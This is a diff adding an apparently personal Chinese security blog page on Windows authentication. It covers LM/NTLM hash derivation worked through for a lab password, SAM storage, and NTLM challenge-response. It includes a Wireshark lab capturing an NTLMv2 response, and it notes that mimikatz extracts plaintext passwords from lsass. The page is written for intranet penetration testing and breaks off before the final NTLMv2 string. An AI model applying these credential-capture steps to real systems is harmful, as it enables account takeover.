@@ -1,0 +1,1074 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="windows认证1.windows本地认证–NTML哈希和LM哈希本地认证流程Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与SAM文件中的密码进行对比，如果相同，则认证成功 SAM文件是位于 %SystemRoot%\system32\config\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网-Windows认证">
+<meta property="og:url" content="http://example.com/2023/11/03/%E5%86%85%E7%BD%91-Windows%E8%AE%A4%E8%AF%81/index.html">
+<meta property="og:site_name" content="r1ckyL&#39;s secret">
+<meta property="og:description" content="windows认证1.windows本地认证–NTML哈希和LM哈希本地认证流程Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与SAM文件中的密码进行对比，如果相同，则认证成功 SAM文件是位于 %SystemRoot%\system32\config\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231009144637224.png">
+<meta property="og:image" content="http://example.com/img/image-20231009144807369.png">
+<meta property="og:image" content="http://example.com/img/image-20231009150243938.png">
+<meta property="og:image" content="http://example.com/img/image-20231009151538585.png">
+<meta property="og:image" content="http://example.com/img/image-20231009151752307.png">
+<meta property="og:image" content="http://example.com/img/image-20231009152209061.png">
+<meta property="og:image" content="http://example.com/img/image-20231009153855803.png">
+<meta property="og:image" content="http://example.com/img/image-20231009154103331.png">
+<meta property="og:image" content="http://example.com/img/image-20231009154120614.png">
+<meta property="og:image" content="http://example.com/img/image-20231009154315113.png">
+<meta property="og:image" content="http://example.com/img/image-20231009154403511.png">
+<meta property="og:image" content="http://example.com/img/image-20231009154430297.png">
+<meta property="og:image" content="http://example.com/img/image-20231009163808577.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164117440.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164148506.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164204139.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164228194.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164302863.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164334448.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164435194.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164715662.png">
+<meta property="og:image" content="http://example.com/img/image-20231009164910004.png">
+<meta property="og:image" content="http://example.com/img/image-20231009172740642.png">
+<meta property="og:image" content="http://example.com/img/image-20231009172805409.png">
+<meta property="og:image" content="http://example.com/img/image-20231009173548739.png">
+<meta property="og:image" content="http://example.com/img/image-20231009173908563.png">
+<meta property="og:image" content="http://example.com/img/image-20231009173952708.png">
+<meta property="og:image" content="http://example.com/img/image-20231009174038108.png">
+<meta property="og:image" content="http://example.com/img/image-20231009174117654.png">
+<meta property="og:image" content="http://example.com/img/image-20231009174149420.png">
+<meta property="og:image" content="http://example.com/img/image-20231010145650895.png">
+<meta property="og:image" content="http://example.com/img/image-20231010145937348.png">
+<meta property="og:image" content="http://example.com/img/image-20231010145956811.png">
+<meta property="og:image" content="http://example.com/img/image-20231010152245413.png">
+<meta property="og:image" content="http://example.com/img/image-20231010152411743.png">
+<meta property="og:image" content="http://example.com/img/image-20231010152459188.png">
+<meta property="og:image" content="http://example.com/img/image-20231010152736649.png">
+<meta property="og:image" content="http://example.com/img/image-20231010152811590.png">
+<meta property="og:image" content="http://example.com/img/image-20231010153142329.png">
+<meta property="og:image" content="http://example.com/img/image-20231010153848759.png">
+<meta property="og:image" content="http://example.com/img/image-20231010153946573.png">
+<meta property="og:image" content="http://example.com/img/image-20231010154044275.png">
+<meta property="og:image" content="http://example.com/img/image-20231010154226444.png">
+<meta property="og:image" content="http://example.com/img/image-20231010154304566.png">
+<meta property="og:image" content="http://example.com/img/image-20231010154917002.png">
+<meta property="og:image" content="http://example.com/img/image-20231010155130795.png">
+<meta property="og:image" content="http://example.com/img/image-20231010155137094.png">
+<meta property="og:image" content="http://example.com/img/image-20231010161311015.png">
+<meta property="og:image" content="http://example.com/img/image-20231010161346581.png">
+<meta property="og:image" content="http://example.com/img/image-20231010163307144.png">
+<meta property="og:image" content="http://example.com/img/image-20231010163322321.png">
+<meta property="og:image" content="http://example.com/img/image-20231010163543546.png">
+<meta property="og:image" content="http://example.com/img/image-20231010163930167.png">
+<meta property="og:image" content="http://example.com/img/image-20231010164116810.png">
+<meta property="og:image" content="http://example.com/img/image-20231010164225754.png">
+<meta property="og:image" content="http://example.com/img/image-20231010164633305.png">
+<meta property="og:image" content="http://example.com/img/image-20231010171348936.png">
+<meta property="og:image" content="http://example.com/img/image-20231010171613721.png">
+<meta property="og:image" content="http://example.com/img/image-20231010171802035.png">
+<meta property="article:published_time" content="2023-11-03T03:53:41.000Z">
+<meta property="article:modified_time" content="2023-11-03T04:11:14.615Z">
+<meta property="article:author" content="r1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20231009144637224.png">
+  
+  
+  
+  <title>内网-Windows认证 - r1ckyL&#39;s secret</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r1ckyL</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网-Windows认证"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-03 11:53" pubdate>
+          2023年11月3日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          114 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网-Windows认证</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="windows认证"><a href="#windows认证" class="headerlink" title="windows认证"></a>windows认证</h1><h2 id="1-windows本地认证–NTML哈希和LM哈希"><a href="#1-windows本地认证–NTML哈希和LM哈希" class="headerlink" title="1.windows本地认证–NTML哈希和LM哈希"></a>1.windows本地认证–NTML哈希和LM哈希</h2><h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><p>Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与SAM文件中的密码进行对比，如果相同，则认证成功</p>
+<p>SAM文件是位于 %SystemRoot%\system32\config\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密码。</p>
+<p><img src="/img/image-20231009144637224.png" srcset="/img/loading.gif" lazyload alt="image-20231009144637224"></p>
+<p><strong>windows本地认证流程：</strong></p>
+<p><img src="/img/image-20231009144807369.png" srcset="/img/loading.gif" lazyload alt="image-20231009144807369"></p>
+<p>首先，用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面，也就是输入框界面，接收用户的输入信息后，将密码交给lsass进程，这个过程中会存一份明文密码<strong>，将明文密码加密成NTLM Hash，对SAM数据库进行比较认证</strong> </p>
+<p>Windows Logon Process（即winlogon.exe）：是Windows NT用户登陆程序，用于管理用户登陆和退出 </p>
+<p>LSASS：用于微软Windows系统的安全机制，它用于本地安全和登陆策略 </p>
+<p><strong>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</strong></p>
+<h3 id="LM和NTLM哈希"><a href="#LM和NTLM哈希" class="headerlink" title="LM和NTLM哈希"></a>LM和NTLM哈希</h3><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中,用户信息存储在ntds.dit中,加密后为散列值。 </p>
+<p>Windows操作系统中的密码一般由两部分组成,一部分为 LM Hash,另一部分为NTLMHash。在 Windows操作系统中,Hash的结构通常如下</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">username:RID:LM‐<span class="hljs-built_in">HASH</span>:NT‐<span class="hljs-built_in">HASH</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>LM Hash</strong>的全名为”LAN Manager Hash”,是微软为了提高 Windows操作系统的安全性而采用的散列加密算法,其本质是<strong>DES加密</strong>。尽管 LM Hash较容易被破解,但为了保证系统的兼容性, Windows只是将LM Hash禁用了(从 Windows vista和 Windows Server2008版本开始, Windows操作系统默认禁用 LM Hash)。</p>
+<p>LM Hash明文密码被限定在14位以内,也就是说,如果要停止使用 LM Hash,将用户的密码设置为14位以上即可。如果 LM Hash被禁用了, 攻击者通过工具抓取的 LM Hash通常为“ad3b435b51404eead3b435b51404ee”(表示 LM Hash为空值或被禁用) </p>
+<p><strong>NTLM Hash</strong>是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是<strong>基于MD4加密算</strong> username:RID:LM‐HASH:NT‐HASH 法进行加密的。个人版从 Windows vista以后,服务器版从 Windows Server 2003以后, Windows操作系统的认证方式均为 NTLM Hash </p>
+<p>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。下面是各个版本对LM和NTLM的支持。</p>
+<p><img src="/img/image-20231009150243938.png" srcset="/img/loading.gif" lazyload alt="image-20231009150243938"></p>
+<h3 id="LM-hash原理"><a href="#LM-hash原理" class="headerlink" title="LM hash原理"></a>LM hash原理</h3><p>1、将明文口令转换为其大写形式 假设这里以明文Admin@123为例，转换为大写格式为：ADMIN@123 </p>
+<p>2、 将字符串大写后转换为16进制字符串转换后为 41 44 4D 49 4E 40 31 32 33 </p>
+<p>3、密码不足14字节要求用0补全， 1Byte&#x3D;8bit,上面的16进制字符串共9个字节,还差5个字节 使用 00 00 00 00 00 补全为 41 44 4D 49 4E 40 31 32 33 00 00 00 00 00 </p>
+<p>4、将上述编码分成2组7字节</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">41 </span><span class="hljs-number">44</span> <span class="hljs-number">4</span>D <span class="hljs-number">49</span> <span class="hljs-number">4</span>E <span class="hljs-number">40</span> <span class="hljs-number">31</span> 第一组<br><span class="hljs-symbol">32 </span><span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 第二组<br></code></pre></td></tr></table></figure>
+
+<p>5、将每一组7字节的十六进制转换为二进制，每7bit一组末尾加0，再转换成十六进制组成得到2组8字节的编码 </p>
+<p>第一组：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">16</span>进制：<span class="hljs-number">41</span> <span class="hljs-number">44</span> <span class="hljs-number">4</span>D <span class="hljs-number">49</span> <span class="hljs-number">4</span>E <span class="hljs-number">40</span> <span class="hljs-number">31</span><br>转换为二进制：<span class="hljs-number">01000001010001000100110101001001010011100100000000110001</span><br>七个为一组末尾补<br><span class="hljs-number">01000000</span><br><span class="hljs-number">10100010</span><br><span class="hljs-number">00010010</span><br><span class="hljs-number">10101000</span><br><span class="hljs-number">10010100</span><br><span class="hljs-number">01110010</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">01100010</span><br>合并后为<span class="hljs-number">0100000010100010000100101010100010010100011100100000000001100010</span><br>在转换为<span class="hljs-number">16</span>进制：<span class="hljs-number">40</span>A212A<span class="hljs-number">894720062</span><br></code></pre></td></tr></table></figure>
+
+<p>第二组：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">16</span>进制：<span class="hljs-number">32 33 00 00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>转换为二进制：<span class="hljs-number">00110010001100110000000000000000000000000000000000000000</span><br>七个为一组末尾补<br><span class="hljs-number">00110010</span><br><span class="hljs-number">00011000</span><br><span class="hljs-number">11000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br>合并后为<span class="hljs-number">0011001000011000110000000000000000000000000000000000000000000000</span><br>在转换为<span class="hljs-number">16</span>进制：<span class="hljs-number">3218</span>C<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>
+
+<p>6、将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串 <strong>KGS!@#$%</strong> 进行加密 </p>
+<p>KGS!@#$%的16进制为 4B47532140232425  作为明文进行加密</p>
+<p>第一组：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">明文：<span class="hljs-number">4B47532140232425</span><br>密钥：40A212A894720062<br>密文：6F08D7B306B1DAD4<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231009151538585.png" srcset="/img/loading.gif" lazyload alt="image-20231009151538585" style="zoom:80%;" />
+
+<p>第二组：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">明文：<span class="hljs-number">4B47532140232425</span><br>密钥：3218C00000000000<br>密文：B75E0C8D76954A50<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231009151752307.png" srcset="/img/loading.gif" lazyload alt="image-20231009151752307" style="zoom:80%;" />
+
+<p>7、最终结果拼接即可6F08D7B306B1DAD4B75E0C8D76954A50  这个值就是LMhash值</p>
+<h3 id="NTLM-hash原理"><a href="#NTLM-hash原理" class="headerlink" title="NTLM hash原理"></a>NTLM hash原理</h3><p>1.将明文口令转换成十六进制的格式 如：Admin@123 转换成Unicode格式，即在每个字节之后添加0x00</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">Admin@<span class="hljs-number">123</span>转<span class="hljs-number">16</span>进制 <span class="hljs-number">41646</span>D6<span class="hljs-number">96E40313233</span><br>添加<span class="hljs-number">00</span>：<span class="hljs-number">410064006</span>D0069006E0040003<span class="hljs-number">10032003300</span><br></code></pre></td></tr></table></figure>
+
+<p>2.对Unicode字符串作MD4加密，生成32位的十六进制数字串 570a9a65db8fba761c1008a51d4c95ab</p>
+<p><img src="/img/image-20231009152209061.png" srcset="/img/loading.gif" lazyload alt="image-20231009152209061"></p>
+<h3 id="SAM文件存储的内容"><a href="#SAM文件存储的内容" class="headerlink" title="SAM文件存储的内容"></a>SAM文件存储的内容</h3><p>以用户admin 密码Admin@123为例  lsass.exe文件生成的值和SAM文件存储的值即为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>:RID:LM‐HASH:NT‐HASH<br><span class="hljs-attribute">admin</span>:RID:<span class="hljs-number">6</span>F08D7B306B1DAD4B75E0C8D76954A50:<span class="hljs-number">570</span>a9a65db8fba761c1008a51d4c95ab<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-windows网络认证–基于挑战响应认证的NTLM协议"><a href="#2-windows网络认证–基于挑战响应认证的NTLM协议" class="headerlink" title="2.windows网络认证–基于挑战响应认证的NTLM协议"></a>2.windows网络认证–基于挑战响应认证的NTLM协议</h2><h3 id="网络认证NTLM协议简介"><a href="#网络认证NTLM协议简介" class="headerlink" title="网络认证NTLM协议简介"></a>网络认证NTLM协议简介</h3><p>在平时的测试中，经常会碰到处于工作组的计算机，处于工作组的计算机之间是无法建立一个可信的信托机构的， 只能是点对点进行信息的传输。举个例子就是，主机A想要访问主机B上的资源，就要向主机B发送一个存在于主机B上的一个账户，主机B接收以后会在本地进行验证，如果验证成功，才会允许主机A进行相应的访问。 </p>
+<p>NTLM 协议是一种基于挑战（Chalenge）&#x2F;响应（Response） 认证机制，仅支持Windows的网络认证协议。</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。<br>质询，这一步便是Chalenge/<span class="hljs-built_in">Response</span>认证机制的关键之处，下面会介绍这里的步骤。<br>验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源<br></code></pre></td></tr></table></figure>
+
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><h4 id="认证成功的流程"><a href="#认证成功的流程" class="headerlink" title="认证成功的流程"></a>认证成功的流程</h4><p>1、首先，client会向server发送一个username，这个username是存在于server上的一个用户</p>
+<img src="/img/image-20231009153855803.png" srcset="/img/loading.gif" lazyload alt="image-20231009153855803" style="zoom: 80%;" />
+
+<p>2、server首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个16位的随机字符，即Challenge，然后用查询到的这个user的NTLM hash对Challenge进行加密，生成Challenge1，将Challenge1存储在本地，并将 Challenge传给client。</p>
+<img src="/img/image-20231009154103331.png" srcset="/img/loading.gif" lazyload alt="image-20231009154103331" style="zoom:80%;" />
+
+<p>3、当client接收到Chalenge时，将发送的username所对应的NTLM hash对Challenge进行加密即Response，并 Response发送给server。</p>
+<img src="/img/image-20231009154120614.png" srcset="/img/loading.gif" lazyload alt="image-20231009154120614" style="zoom: 67%;" />
+
+<p>4、server在收到Response后，将其与Challenge1进行比较，如果相同，则验证成功</p>
+<img src="/img/image-20231009154315113.png" srcset="/img/loading.gif" lazyload alt="image-20231009154315113" style="zoom:80%;" />
+
+
+
+<h4 id="认证失败的流程"><a href="#认证失败的流程" class="headerlink" title="认证失败的流程"></a>认证失败的流程</h4><p>1、首先，client会向server发送一个username，这个username是存在于server上的一个用户</p>
+<img src="/img/image-20231009154403511.png" srcset="/img/loading.gif" lazyload alt="image-20231009154403511" style="zoom:80%;" />
+
+<p>2、当server接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败</p>
+<img src="/img/image-20231009154430297.png" srcset="/img/loading.gif" lazyload alt="image-20231009154430297" style="zoom:80%;" />
+
+
+
+<h3 id="NTLM协议v1与v2的区别"><a href="#NTLM协议v1与v2的区别" class="headerlink" title="NTLM协议v1与v2的区别"></a>NTLM协议v1与v2的区别</h3><p>NTLM V2协议，NTLMv1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是 NTLM Hash</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">NTLM</span> <span class="hljs-built_in">v1</span>的Challenge有<span class="hljs-number">8</span>位，NTLM <span class="hljs-built_in">v1</span>的主要加密算法是DES<br><span class="hljs-symbol">NTLM</span> <span class="hljs-built_in">v2</span>的Challenge为<span class="hljs-number">16</span>位；NTLM <span class="hljs-built_in">v2</span>的主要加密算法是HMAC‐MD5<br></code></pre></td></tr></table></figure>
+
+<h3 id="抓包分析实验"><a href="#抓包分析实验" class="headerlink" title="抓包分析实验"></a>抓包分析实验</h3><p>1.实验环境</p>
+<p><img src="/img/image-20231009163808577.png" srcset="/img/loading.gif" lazyload alt="image-20231009163808577"></p>
+<p>2.windows10 安装wireshark</p>
+<p>3、使用如下命令进行远程连接，并且使用wireshark 包</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.41.130 /<span class="hljs-keyword">u</span>:kkk Admin@123   建立连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> * /del   删除连接<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231009164117440.png" srcset="/img/loading.gif" lazyload alt="image-20231009164117440"></p>
+<p>4、前5个数据包中前四条时协商，第五个是认证的第一个数据包</p>
+<p><img src="/img/image-20231009164148506.png" srcset="/img/loading.gif" lazyload alt="image-20231009164148506"></p>
+<p>5、第6个数据包就是返回challenge挑战值</p>
+<p><img src="/img/image-20231009164204139.png" srcset="/img/loading.gif" lazyload alt="image-20231009164204139"></p>
+<p>分析该数据包得到chalenge值 53fb7eb8d40cc777</p>
+<p><img src="/img/image-20231009164228194.png" srcset="/img/loading.gif" lazyload alt="image-20231009164228194"></p>
+<p>6、第7个数据包就是返回response的数据包 </p>
+<p>response数据如下：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">3d</span>00ee8a5618f85651098b8005883d5c0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e0031003300300000000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231009164302863.png" srcset="/img/loading.gif" lazyload alt="image-20231009164302863"></p>
+<p>7、接下来得到NTLMv2 数据，NTLMv2格式如下：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username::<span class="hljs-keyword">domain</span>:challenge:HMAC‐MD5:blob<br>username：对应数据包中 <span class="hljs-keyword">user</span> <span class="hljs-type">name</span><br><span class="hljs-keyword">domain</span>:对应数据包中的 <span class="hljs-keyword">Domain</span> <span class="hljs-type">name</span><br>HMAC‐MD5：对应数据包中的NTProofStr<br>blob：数据库包中rsponse去掉HMAC‐MD5的值<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231009164334448.png" srcset="/img/loading.gif" lazyload alt="image-20231009164334448"></p>
+<p>8、最终的到HTLMv2如下：</p>
